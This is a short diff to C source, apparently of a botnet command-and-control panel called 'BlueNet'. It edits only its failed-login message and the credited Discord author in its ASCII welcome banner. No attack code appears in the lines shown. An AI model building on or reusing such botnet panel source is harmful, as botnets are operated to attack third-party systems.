@@ -330,7 +330,7 @@ void *BotWorker(void *sock) {
 		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
 		char failed_line1[80];
 
-		sprintf(failed_line1, "\x1b[36mWRONG ANSWER BITCH!!\r\n");
+		sprintf(failed_line1, "\x1b[36mGo away filthy hacker!!!\r\n");
 		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
 		sleep(5);
         goto end;
@@ -351,7 +351,7 @@ void *BotWorker(void *sock) {
 		memset(banner_bot_count, 0, 2048);
 		
 		sprintf(ascii_banner_line1, "\x1b[36m          Welcome to BlueNet         \r\n");
-		sprintf(ascii_banner_line2, "\x1b[36m  MADE BY BLUEMATRIX#7626 - Discord  \r\n");
+		sprintf(ascii_banner_line2, "\x1b[36m   MADE BY CyberDuck#7626 - Discord  \r\n");
 		sprintf(ascii_banner_line3, "\x1b[36m   ______              _   _         \r\n");
 		sprintf(ascii_banner_line4, "\x1b[36m  |  _ \ \            | \ | |        \r\n");
 		sprintf(ascii_banner_line5, "\x1b[36m  | |_) ) \  _   _ ___|  \| |___ ___ \r\n");
